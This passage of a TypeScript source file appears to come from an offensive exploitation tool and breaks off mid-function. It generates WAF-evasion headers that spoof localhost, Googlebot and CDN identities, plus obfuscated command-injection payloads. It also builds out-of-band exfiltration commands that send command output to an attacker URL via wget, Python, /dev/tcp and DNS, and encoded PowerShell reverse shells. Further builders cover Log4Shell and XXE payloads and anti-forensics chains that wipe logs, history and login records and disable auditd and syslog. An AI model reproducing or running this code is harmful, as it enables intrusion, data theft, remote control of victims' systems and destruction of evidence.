      "Accept-Encoding": "gzip, deflate, br",
      "X-Forwarded-For": `127.0.0.1, ${ip()}, ${ip()}, 10.0.0.1`,
      "X-Real-IP": "127.0.0.1",
      "X-Originating-IP": "127.0.0.1",
      "X-Remote-IP": "127.0.0.1",
      "X-Client-IP": "127.0.0.1",
      "Forwarded": "for=127.0.0.1;proto=https;by=127.0.0.1;host=localhost",
    },
    /* ── HTTP/1.0 downgrade (no Host required by RFC) ── */
    {
      "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
      "Accept": "*/*",
      "Accept-Encoding": "gzip",
      "X-Forwarded-For": "127.0.0.1",
      "Connection": "close",
      "Pragma": "no-cache",
    },
    /* ── Pentest tool masquerade ── */
    {
      "User-Agent": "Nessus SOAP v0.0.1 (Nessus; http://www.nessus.org)",
      "Accept": "*/*",
      "X-Forwarded-For": "127.0.0.1",
      "X-Real-IP": "127.0.0.1",
    },
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   CHUNKED BYPASS  —  for length-limited injection fields
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildChunkedBypass(payload: string, chunkSize = 16): string[] {
  const B64    = b64(payload);
  const chunks: string[] = [];
  for (let i = 0; i < B64.length; i += chunkSize) chunks.push(B64.slice(i, i + chunkSize));
  const vnames  = chunks.map((_, i) => `_NXC${i}`);
  const assigns = chunks.map((c, i) => `${vnames[i]}=${JSON.stringify(c)}`).join(";");
  const concat  = vnames.map(v => `$${v}`).join("");
  return [
    `${assigns};eval$(echo ${concat}|base64 -d)`,
    `${assigns};bash<<<$(echo ${concat}|base64 -d)`,
    `${assigns};python3 -c "import base64,os;os.system(base64.b64decode(${JSON.stringify(B64)}).decode())"`,
    chunks.map((c,i)=>`export ${vnames[i]}=${JSON.stringify(c)}`).join(";") + `;eval$(echo ${concat}|base64 -d)`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   COMPATIBILITY EXPORTS — used by streamExec.ts
   ═══════════════════════════════════════════════════════════════════════════ */

/** Returns an array of WAF-bypass payload variants for a given payload string.
 *  Combines: WAF bypass variants + stealth shell tricks + timing oracles + polymorphic samples.
 */
export function buildPayloadVariants(payload: string): string[] {
  const wafVariants = buildWafBypass(payload)
    .split("\n")
    .map(l => l.trim())
    .filter(l => l.length > 0);
  const stealthSample  = buildStealthPayloads(payload).slice(0, 8);
  const timingSample   = buildTimingPayloads(7).slice(0, 6);
  const polyVariants   = Array.from({ length: 6 }, () => buildPolymorphicPayload(payload, "quantum"));
  const lengthOptimal  = buildLengthOptimizedPayloads(payload).slice(0, 6);
  return [...new Set([...wafVariants, ...stealthSample, ...timingSample, ...polyVariants, ...lengthOptimal])];
}

/** Returns an array of SSTI payload strings for the given command. */
export function buildSSTIPayloads(cmd: string): string[] {
  return applyQuantumBypass(cmd, "ssti")
    .split("\n")
    .map(l => l.trim())
    .filter(l => l.length > 0);
}

/** Returns an array of Log4Shell JNDI payload strings targeting attackerIp:attackerPort. */
export function buildLog4ShellPayloads(attackerIp: string, attackerPort: string): string[] {
  return applyQuantumBypass("exploit", "log4shell", attackerIp, attackerPort)
    .split("\n")
    .map(l => l.trim())
    .filter(l => l.length > 0);
}

/** Returns an array of XXE payload strings for the given attacker host/port. */
export function buildXXEPayloads(attackerIp: string, attackerPort: string): string[] {
  return applyQuantumBypass("exploit", "xxe", attackerIp, attackerPort)
    .split("\n")
    .map(l => l.trim())
    .filter(l => l.length > 0);
}

/* ═══════════════════════════════════════════════════════════════════════════
   TIMING ORACLE — sleep-based blind RCE detection
   Deliberately avoids curl/wget/base64 to stay under WAF radar.
   Uses multiple sleep primitives so at least one works per target platform.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildTimingPayloads(delaySec = 7): string[] {
  const d   = String(Math.floor(delaySec));
  const ms  = String(Math.floor(delaySec) * 1000);
  const IFS = "${IFS}";
  const T   = "\t";

  return [
    `;sleep${IFS}${d}`,
    `|sleep${IFS}${d}`,
    `&&sleep${IFS}${d}&&`,
    `%0asleep${IFS}${d}%0a`,
    `;sleep${T}${d}`,
    `;/???/sleep${IFS}${d}`,
    `;/usr/bin/sleep${IFS}${d}`,
    `;/bin/sleep${IFS}${d}`,
    `;$(printf${IFS}'\\x73\\x6c\\x65\\x65\\x70')${IFS}${d}`,
    `;$0<<<"sleep${IFS}${d}"`,
    `;ping${IFS}-c${IFS}${d}${IFS}127.0.0.1`,
    `|ping${IFS}-c${IFS}${d}${IFS}127.0.0.1`,
    `;ping${T}-c${T}${d}${T}127.0.0.1`,
    `;ping${IFS}-c${IFS}${d}${IFS}::1`,
    `;python3${IFS}-c${IFS}'import${IFS}time;time.sleep(${d})'`,
    `;python${IFS}-c${IFS}'import${IFS}time;time.sleep(${d})'`,
    `;perl${IFS}-e${IFS}'sleep(${d})'`,
    `;ruby${IFS}-e${IFS}"sleep(${d})"`,
    `;node${IFS}-e${IFS}"var${IFS}s=Date.now();while(Date.now()-s<${ms}){}"`,
    `;php${IFS}-r${IFS}"sleep(${d});"`,
    `;usleep${IFS}$((${d}*1000000))`,
    `;sleep${IFS}${d}.0`,
    `;read${IFS}-t${IFS}${d}${IFS}__x`,
    `|read${IFS}-t${IFS}${d}${IFS}__x`,
    `;$(printf${IFS}'\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68')${IFS}-c${IFS}'sleep${IFS}${d}'`,
    `;_s=sleep;$_s${IFS}${d}`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   STEALTH PAYLOADS — avoid base64/bash/eval keywords
   Uses $0 (current shell ref), printf hex/octal, IFS, read built-in.
   Designed to look like benign input to WAF signature matchers.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildStealthPayloads(cmd: string): string[] {
  const HEX    = hexEsc(cmd);
  const OCT    = octEsc(cmd);
  const IFS    = "${IFS}";
  const T      = "\t";
  const words  = cmd.split(/\s+/);
  const bin0   = words[0] ?? "id";
  const args   = words.slice(1).join(" ");
  const tabCmd = cmd.replace(/ /g, T);
  const Q      = JSON.stringify(cmd);

  return [
    `;$0<<<${Q}`,
    `|$0<<<${Q}`,
    `&&$0<<<${Q}&&`,
    `;$(printf${IFS}'${HEX}')`,
    `|$(printf${IFS}'${HEX}')`,
    `;$(printf${IFS}'${OCT}')`,
    `;printf${IFS}'${HEX}'|$0`,
    `;printf${IFS}'${OCT}'|$0`,
    `;$0<<<"$(printf${IFS}'${HEX}')"`,
    `;read${IFS}_C<<<${Q};$0<<<"$_C"`,
    `;_C=${Q};$0<<<$_C`,
    `;export${IFS}_NXC=${Q};$0<<<$_NXC`,
    `;${tabCmd}`,
    `;${cmd.replace(/ /g, IFS)}`,
    `;{${cmd};}`,
    `;(${cmd})`,
    `;/???/b??h<<<${Q}`,
    `;.${T}<(printf${IFS}'${HEX}')`,
    `;_B=$0;$_B<<<"${cmd.replace(/"/g, '\\"')}"`,
    `;${bin0}${T}${args}`,
    `;${cmd}&true`,
    `;${cmd}${IFS}2>&1`,
    `\n${cmd}\n`,
    `\r\n${cmd}\r\n`,
    `;declare${IFS}_D=${Q};$0<<<$_D`,
    `;export${IFS}BASH_ENV=/dev/stdin;$0<<<${Q}`,
    `;$(command${IFS}-v${IFS}sh)<<<${Q}`,
    `;$(type${IFS}-p${IFS}sh)<<<${Q}`,
    `;exec${IFS}-a${IFS}'[kworker/0:0]'${IFS}$0<<<${Q}`,
    `;${IFS}${cmd}${IFS}`,
    `;mapfile${IFS}-t${IFS}_A<<<${Q};$0<<<$_A`,
    `;_X=$(printf${IFS}'${HEX}');$_X`,
    `;${bin0}<<<${JSON.stringify(args)}`,
    `;$SHELL<<<${Q}`,
    `;$BASH<<<${Q}`,
    `;source${IFS}<(printf${IFS}'${HEX}')`,
    `;.${IFS}<(echo${IFS}${Q})`,
  ].filter(p => p.trim().length > 1);
}

/* ═══════════════════════════════════════════════════════════════════════════
   LOW-NOISE OOB EXFIL — wget / python urllib / /dev/tcp (no curl)
   curl is the most-blocked exfil binary. These use alternatives.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildLowNoiseOobPayloads(cmd: string, oobUrl: string, tok: string): string[] {
  const IFS     = "${IFS}";
  let host      = "localhost";
  let oobPort   = "80";
  try {
    const u   = new URL(oobUrl);
    host      = u.hostname;
    oobPort   = u.port || (u.protocol === "https:" ? "443" : "80");
  } catch { /* keep defaults */ }

  return [
    `_O=$(${cmd}${IFS}2>&1);wget${IFS}-qO/dev/null${IFS}--timeout=8${IFS}"${oobUrl}/${tok}?d=$(printf${IFS}'%s'${IFS}"$_O"|head${IFS}-c200|tr${IFS}-cd${IFS}'A-Za-z0-9+/=')" 2>/dev/null &`,
    `_O=$(${cmd}${IFS}2>&1);python3${IFS}-c${IFS}"import urllib.request as r,base64,os;r.urlopen('${oobUrl}/${tok}?d='+base64.b64encode(os.popen(${JSON.stringify(cmd)}).read(512).encode()).decode().replace('+','%2B'))" 2>/dev/null &`,
    `_O=$(${cmd}${IFS}2>&1);python${IFS}-c${IFS}"import urllib2,base64,os;urllib2.urlopen('${oobUrl}/${tok}?d='+base64.b64encode(os.popen(${JSON.stringify(cmd)}).read(512)))" 2>/dev/null &`,
    `_O=$(${cmd}${IFS}2>&1);_B=$(printf${IFS}'%s'${IFS}"$_O"|head${IFS}-c128|tr${IFS}-cd${IFS}'[:alnum:]');exec${IFS}3>/dev/tcp/${host}/${oobPort};printf${IFS}"GET /${tok}?d=$_B HTTP/1.0\r\nHost:${IFS}${host}\r\nConnection:${IFS}close\r\n\r\n">&3 2>/dev/null &`,
    `_O=$(${cmd}${IFS}2>&1|head${IFS}-c30|tr${IFS}-cd${IFS}'[:alnum:]');nslookup${IFS}"$_O.${host}" 2>/dev/null &`,
    `_O=$(${cmd}${IFS}2>&1);openssl${IFS}s_client${IFS}-quiet${IFS}-connect${IFS}${host}:${oobPort}${IFS}<<<$(printf${IFS}"GET /${tok}?d=$(printf${IFS}'%s'${IFS}"$_O"|tr${IFS}-cd${IFS}'A-Za-z0-9+/='|head${IFS}-c150) HTTP/1.0\r\nHost:${IFS}${host}\r\n\r\n") 2>/dev/null &`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   WINDOWS TIMING ORACLE — ping -n / timeout / Start-Sleep timing (no sleep)
   All use built-in Windows binaries present on every Windows version.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildWindowsTimingPayloads(delaySec = 7): string[] {
  const d  = String(Math.floor(delaySec));
  const ms = String(Math.floor(delaySec) * 1000);
  return [
    `& ping -n ${d} 127.0.0.1`,
    `| ping -n ${d} 127.0.0.1`,
    `%0aping -n ${d} 127.0.0.1%0a`,
    `\r\nping -n ${d} 127.0.0.1`,
    `& ping -n ${d} ::1`,
    `| ping -n ${d} ::1`,
    `& timeout /T ${d} /NOBREAK`,
    `| timeout /T ${d} /NOBREAK`,
    `& powershell -c "Start-Sleep -Seconds ${d}"`,
    `| powershell -c "Start-Sleep -Milliseconds ${ms}"`,
    `& powershell -w hidden -c "[System.Threading.Thread]::Sleep(${ms})"`,
    `& w32tm /stripchart /computer:127.0.0.1 /samples:${d} /dataonly 2>nul`,
    `& waitfor /T ${d} NEXTEST 2>nul`,
    `& choice /T ${d} /C YN /D Y >nul`,
    `& cmd /V:ON /c "set _S=!TIME!&ping -n ${d} 127.0.0.1>nul"`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   WINDOWS REVERSE SHELLS — PowerShell TCP reverse shells (encoded UTF-16LE)
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildWindowsReverseShells(ip: string, port: string): string[] {
  const psB64 = (s: string): string => {
    const buf = Buffer.alloc(s.length * 2);
    for (let i = 0; i < s.length; i++) buf.writeUInt16LE(s.charCodeAt(i), i * 2);
    return buf.toString("base64");
  };
  const full = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sB=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sB,0,$sB.Length);$s.Flush()};$c.Close()`;
  const mini = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$s.Write($st,0,$st.Length)}`;
  const encFull = psB64(full);
  const encMini = psB64(mini);
  return [
    `& powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${encFull}`,
    `| powershell -NoP -NonI -W Hidden -Exec Bypass -enc ${encFull}`,
    `; powershell -enc ${encFull}`,
    `& powershell -enc ${encMini}`,
    `& %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ${encFull}`,
    `& cmd /c "powershell -enc ${encFull}"`,
    `& mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc ${encFull}"",0,True(close)")`,
    `& wmic process call create "powershell -enc ${encMini}"`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   WINDOWS PAYLOADS — CMD.EXE + PowerShell injection for Windows targets
   Techniques: cmd metachar, caret obfuscation, %COMSPEC%, empty-string split,
   env-var path resolution, PowerShell direct, PowerShell -EncodedCommand
   (UTF-16LE base64), PS obfuscation, WMI, mshta VBScript, tab/pct09 spaces,
   delayed-expansion /V:ON, for-loop execution, .NET Process::Start.
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildWindowsPayloads(cmd: string): string[] {
  const psBuf = Buffer.alloc(cmd.length * 2);
  for (let i = 0; i < cmd.length; i++) psBuf.writeUInt16LE(cmd.charCodeAt(i), i * 2);
  const psEnc = psBuf.toString("base64");

  const wrapPs    = `powershell -c "${cmd.replace(/"/g, '\\"')}"`;
  const wrapPsRaw = `Start-Sleep -Seconds 0;${cmd}`;
  const psWrapBuf = Buffer.alloc(wrapPsRaw.length * 2);
  for (let i = 0; i < wrapPsRaw.length; i++) psWrapBuf.writeUInt16LE(wrapPsRaw.charCodeAt(i), i * 2);
  const psWrapEnc = psWrapBuf.toString("base64");

  const qCmd   = cmd.replace(/"/g, '""');
  const bsCmd  = cmd.replace(/"/g, '\\"');
  const tabCmd = cmd.replace(/ /g, "\t");
  const p09Cmd = cmd.replace(/ /g, "%09");
  const caretBin = (cmd.split(" ")[0] ?? cmd).split("").map((c, i, a) =>
    /[a-zA-Z]/.test(c) && i < a.lastIndexOf(c) + 1 ? `${c}^` : c).join("");

  return [
    `& cmd /c ${cmd}`,
    `| cmd /c ${cmd}`,
    `\r\ncmd /c ${cmd}`,
    `%0acmd /c ${cmd}`,
    `%0Acmd /c ${cmd}`,
    `%0d%0acmd /c ${cmd}`,
    `& c^m^d /c ${cmd}`,
    `& "cmd" /c ${cmd}`,
    `& cm""d /c ${cmd}`,
    `& %COMSPEC% /c ${cmd}`,
    `& %ComSpec% /c ${cmd}`,
    `& %SystemRoot%\\System32\\cmd.exe /c ${cmd}`,
    `& %WinDir%\\System32\\cmd.exe /c ${cmd}`,
    `& cmd /V:ON /c "${qCmd}"`,
    `& cmd\t/c\t${tabCmd}`,
    `& ${p09Cmd}`,
    `& ${caretBin} ${cmd.split(" ").slice(1).join(" ")}`,
    `& for /f "delims=" %x in ('${qCmd}') do @echo %x`,
    `; ${wrapPs}`,
    `| powershell.exe -NoP -NonI -W Hidden -Exec Bypass -c "${bsCmd}"`,
    `& powershell -w hidden -c "${bsCmd}"`,
    `& p^o^w^e^r^s^h^e^l^l -c "${bsCmd}"`,
    `& po""wer""she""ll -c "${bsCmd}"`,
    `& powershell -enc ${psEnc}`,
    `| powershell -enc ${psEnc}`,
    `& powershell -w hidden -NoP -NonI -Exec Bypass -enc ${psEnc}`,
    `& powershell -enc ${psWrapEnc}`,
    `& %SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -enc ${psEnc}`,
    `& powershell -c "[System.Diagnostics.Process]::Start('cmd','/c ${bsCmd}')"`,
    `& powershell -c "Invoke-Expression([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('${psEnc}')))"`,
    `& wmic process call create "${qCmd}"`,
    `& wmic process call create "cmd.exe /c ${qCmd}"`,
    `& mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c ${qCmd}"",0,True(close)")`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   ANTI-FORENSICS PAYLOADS — Linux zero-trace evidence elimination
   Tiers:
     1. History suppression   — HISTFILE, unset, history -c, shred
     2. Log obliteration      — truncate/dd all auth,syslog,kern,audit,
                                nginx,apache,mysql,postgres,cron,fail2ban
     3. Login record wipe     — wtmp, btmp, lastlog, utmp (who/last/lastlog)
     4. Syslog daemon control — SIGSTOP before exec, SIGCONT after wipe
     5. Auditd neutralisation — auditctl -e 0, service stop, rule flush
     6. Filesystem forensics  — touch timestamp reset, shred -n3, /dev/shm exec
     7. Proc masking          — exec -a, setsid, unshare -m, env -i
     8. Temp / cache wipe     — /tmp, /var/tmp, /dev/shm, ~/.cache, /run/user
     9. SSH artefact removal  — known_hosts, auth.log ssh entries
    10. Named-pipe execution  — no cmdline args in ps output for the payload
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildAntiForensicsPayloads(cmd: string): string[] {
  const Q = JSON.stringify(cmd);

  const HIST_SUPPRESS = [
    "HISTFILE=/dev/null",
    "export HISTFILE",
    "unset HISTSIZE HISTFILESIZE HISTCONTROL HISTLOG HISTDUP",
    "export HISTIGNORE='*'",
    "history -c 2>/dev/null",
    "history -w /dev/null 2>/dev/null",
  ].join(";");

  const HIST_WIPE = [
    "cat /dev/null > ~/.bash_history 2>/dev/null",
    "cat /dev/null > ~/.zsh_history 2>/dev/null",
    "rm -f ~/.bash_history ~/.zsh_history ~/.sh_history ~/.python_history 2>/dev/null",
    "rm -f ~/.node_repl_history ~/.irb_history ~/.psql_history ~/.mysql_history 2>/dev/null",
    "rm -f ~/.local/share/fish/fish_history ~/.config/fish/fish_history 2>/dev/null",
  ].join(";");

  const HIST_SHRED = [
    "shred -n3 -u -z ~/.bash_history 2>/dev/null||true",
    "shred -n3 -u -z ~/.zsh_history 2>/dev/null||true",
  ].join(";");

  const LOG_LIST = [
    "/var/log/auth.log", "/var/log/syslog", "/var/log/messages",
    "/var/log/kern.log", "/var/log/secure", "/var/log/user.log",
    "/var/log/daemon.log", "/var/log/mail.log", "/var/log/cron.log",
    "/var/log/cron", "/var/log/dpkg.log", "/var/log/apt/history.log",
    "/var/log/dnf.log", "/var/log/yum.log", "/var/log/faillog",
    "/var/log/audit/audit.log", "/var/log/fail2ban.log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    "/var/log/mysql/mysql.log", "/var/log/mysql/error.log",
    "/var/log/postgresql/postgresql.log",
  ];

  const LOG_TRUNC = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&truncate -s0 "$_NXL" 2>/dev/null;done`;
  const LOG_DD    = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&dd if=/dev/zero of="$_NXL" bs=1 count=1 conv=notrunc 2>/dev/null;done`;
  const LOG_SHRED = `for _NXL in ${LOG_LIST.join(" ")};do [ -f "$_NXL" ]&&shred -n2 -z "$_NXL" 2>/dev/null&&truncate -s0 "$_NXL" 2>/dev/null;done`;

  const LOGIN_WIPE = [
    "cat /dev/null > /var/log/wtmp 2>/dev/null",
    "cat /dev/null > /var/log/btmp 2>/dev/null",
    "cat /dev/null > /var/log/lastlog 2>/dev/null",
    "cat /dev/null > /run/utmp 2>/dev/null",
    "utmpdump /var/log/wtmp 2>/dev/null|grep -v \"$(id -un 2>/dev/null)\"|utmpdump -r -o /var/log/wtmp 2>/dev/null",
  ].join(";");

  const TMP_CLEAN = [
    "find /tmp /var/tmp /dev/shm -maxdepth 4 -newer /proc/self -delete 2>/dev/null",
    "find /run/user -maxdepth 3 -newer /proc/self -delete 2>/dev/null",
    "find ~/.cache -maxdepth 3 -newer /proc/self -delete 2>/dev/null",
  ].join(";");

  const AUDIT_KILL = [
    "auditctl -e 0 2>/dev/null",
    "auditctl -D 2>/dev/null",
    "service auditd stop 2>/dev/null",
    "systemctl stop auditd 2>/dev/null",
    "kill -9 $(pidof auditd) 2>/dev/null",
  ].join(";");

  const SYSLOG_STOP = "kill -19 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";
  const SYSLOG_KILL = "kill -9 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";
  const SYSLOG_CONT = "kill -18 $(pidof rsyslogd syslogd syslog-ng) 2>/dev/null";

  const SSH_CLEAN = [
    "cat /dev/null > ~/.ssh/known_hosts 2>/dev/null",
    "rm -f ~/.ssh/known_hosts ~/.ssh/known_hosts.old 2>/dev/null",
    "truncate -s0 ~/.ssh/authorized_keys 2>/dev/null",
  ].join(";");

  const TS_RESET = "touch -r /etc/hosts ~/.bash_history ~/.zsh_history 2>/dev/null";
  const TS_PAST  = "touch -d '2020-01-01 00:00:00' ~/.bash_history 2>/dev/null";

  const CLEAN_FAST = `${HIST_SUPPRESS};${HIST_WIPE};${LOGIN_WIPE}`;
  const CLEAN_FULL = `${HIST_SUPPRESS};${HIST_WIPE};${LOG_TRUNC};${LOGIN_WIPE};${TMP_CLEAN};${AUDIT_KILL};${SSH_CLEAN}`;
  const CLEAN_DEEP = `${AUDIT_KILL};${SYSLOG_KILL};${HIST_SUPPRESS};${HIST_WIPE};${HIST_SHRED};${LOG_SHRED};${LOGIN_WIPE};${TMP_CLEAN};${SSH_CLEAN};${TS_RESET}`;

  return [
    `${cmd};${CLEAN_FAST}`,
    `${HIST_SUPPRESS};${cmd};${HIST_WIPE}`,
    `(HISTFILE=/dev/null HISTSIZE=0 HISTFILESIZE=0 ${cmd})`,
    `${SYSLOG_STOP};${cmd};${CLEAN_FULL};${SYSLOG_CONT}`,
    `${AUDIT_KILL};${cmd};${CLEAN_FULL}`,
    `exec -a '[kworker/0:0]' sh -c ${Q};${CLEAN_FAST}`,
    `setsid sh -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
    `unshare -m sh -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
    `env -i HOME=$HOME PATH=$PATH TERM=xterm sh -c ${Q};${HIST_WIPE}`,
    `bash --norc --noprofile -c ${Q} 2>/dev/null;${CLEAN_FAST}`,
    `_NXR=$(${cmd} 2>&1);echo "$_NXR";${CLEAN_FAST}`,
    `strace -o /dev/null -e trace=none ${cmd} 2>/dev/null;${CLEAN_FAST}`,
    `_NXP=$(mktemp /dev/shm/.XXXXXXXXXX);printf '%s' ${Q}>$_NXP;chmod 700 $_NXP;sh $_NXP;shred -u $_NXP 2>/dev/null;${HIST_SUPPRESS}`,
    `${cmd};${LOG_TRUNC}`,
    `${cmd};${LOG_DD}`,
    `${cmd};${LOGIN_WIPE}`,
    `${cmd};${TMP_CLEAN}`,
    `${cmd};${HIST_SHRED};${HIST_SUPPRESS}`,
    `${cmd};${SSH_CLEAN};${HIST_SUPPRESS};${HIST_WIPE}`,
    `${cmd};${TS_PAST};${HIST_SUPPRESS}`,
    `${SYSLOG_STOP};${AUDIT_KILL};${cmd};${LOG_SHRED};${LOGIN_WIPE};${HIST_WIPE};${SYSLOG_CONT}`,
    `${cmd};${CLEAN_DEEP}`,
    `_NXF=$(mktemp -u /tmp/.XXXXXXXXXX);mkfifo $_NXF 2>/dev/null;${cmd}>$_NXF & cat $_NXF;rm -f $_NXF 2>/dev/null;${HIST_SUPPRESS}`,
    `${AUDIT_KILL};${SYSLOG_KILL};${cmd};${CLEAN_DEEP}`,
  ];
}

/* ═══════════════════════════════════════════════════════════════════════════
   WAF-SPECIFIC BYPASS HEADERS — per-product optimised header sets
   Cloudflare, Akamai, AWS WAF, Imperva, F5 BIG-IP, ModSecurity
   ═══════════════════════════════════════════════════════════════════════════ */
export function buildWafSpecificHeaders(waf: string): Array<Record<string, string>> {
  const w   = waf.toLowerCase();
  const rid = () => Math.random().toString(36).slice(2, 12);
  const base = buildHttpBypassHeaders();

  if (w.includes("cloudflare")) {
    return [
      ...base,
      {
        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "CF-Connecting-IP": "127.0.0.1",
        "CF-IPCountry":     "US",
        "CF-RAY":           `${rid()}-IAD`,
        "CF-Visitor":       '{"scheme":"https"}',
        "X-Forwarded-For":  "127.0.0.1",
        "X-Real-IP":        "127.0.0.1",
        "True-Client-IP":   "127.0.0.1",
      },
      {
        "User-Agent":       "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "From":             "googlebot(at)googlebot.com",
        "X-Forwarded-For":  "66.249.66.1",
        "CF-Connecting-IP": "66.249.66.1",
        "True-Client-IP":   "66.249.66.1",
      },
      {
        "User-Agent":       "Cloudflare-Traffic-Manager/1.0",
        "X-Forwarded-For":  "127.0.0.1",
        "X-Real-IP":        "127.0.0.1",
        "CF-Worker":        "example.workers.dev",
        "CF-Connecting-IP": "::1",
      },
      {
        "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "CF-IPCountry":    "XX",
        "CF-Connecting-IP":"0.0.0.0",
        "X-Forwarded-For": "0.0.0.0",
        "True-Client-IP":  "0.0.0.0",
      },
    ];
  }

  if (w.includes("akamai")) {
    return [
      ...base,
      {
        "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "X-Akamai-CIP":      "127.0.0.1",
        "True-Client-IP":    "127.0.0.1",
        "X-Forwarded-For":   "127.0.0.1",
        "Akamai-Origin-Hop": "1",
        "X-Check-Cacheable": "YES",
      },
      {
        "User-Agent":               "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "X-Akamai-Config-Log-Detail":"true",
        "X-Akamai-Debug-Pragma":    "akamai-x-check-cacheable",
        "X-Forwarded-For":          "127.0.0.1",
        "X-Real-IP":                "127.0.0.1",
        "True-Client-IP":           "127.0.0.1",
      },
    ];
  }

  if (w.includes("aws")) {
    return [
      ...base,
      {
        "User-Agent":       "AmazonCloudFront",
        "X-Forwarded-For":  "127.0.0.1",
        "X-Amzn-Trace-Id":  `Root=1-${rid()}-${rid()}`,
        "X-Amz-Cf-Id":      rid(),
        "Via":              `1.1 ${rid()}.cloudfront.net (CloudFront)`,
        "X-Real-IP":        "127.0.0.1",
      },
      {
        "User-Agent":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "X-Forwarded-For":  "127.0.0.1",
        "X-Amzn-Trace-Id":  `Self=1-${rid()}-${rid()}`,
        "X-Real-IP":        "127.0.0.1",
        "X-Forwarded-Port": "443",
      },
    ];
  }

  if (w.includes("imperva") || w.includes("incapsula")) {
    return [
      ...base,
      {
        "User-Agent":        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Incap-Client-IP":   "127.0.0.1",
        "X-Forwarded-For":   "127.0.0.1",
        "X-Real-IP":         "127.0.0.1",
        "X-Originating-IP":  "127.0.0.1",
      },
    ];
  }

  if (w.includes("f5") || w.includes("big-ip")) {
    return [
      ...base,
      {
        "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "X-Forwarded-For":  "127.0.0.1",
        "X-Real-IP":        "127.0.0.1",
        "F5-CSF":           "F5",
        "X-F5-Auth-Token":  rid(),
      },
    ];
  }

  if (w.includes("modsecurity") || w.includes("modsec") || w.includes("406")) {
    return [
      ...base,
      {
        "User-Agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36",
        "Content-Type":  "application/x-www-form-urlencoded ; charset=utf-8",
        "X-Forwarded-For":"127.0.0.1",
        "X-Real-IP":     "127.0.0.1",
      },
      {
        "User-Agent":    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "Content-Type":  "application/x-www-form-urlencoded\t",
        "X-Forwarded-For":"127.0.0.1",
        "X-Real-IP":     "127.0.0.1",
      },
    ];
  }

  if (w.includes("sucuri")) {
    return [
      ...base,
      {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6998.88 Safari/537.36",
        "X-Sucuri-Clientip": "127.0.0.1",
        "X-Sucuri-Country": "US",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
      },
    ];
  }

  if (w.includes("barracuda")) {
    return [
      ...base,
      {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "BWCE-Bypass": "1",
        "X-Barracuda-Bypass": "1",
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "127.0.0.1",
      },
    ];
  }

  if (w.includes("varnish")) {
    return [
      ...base,
      {
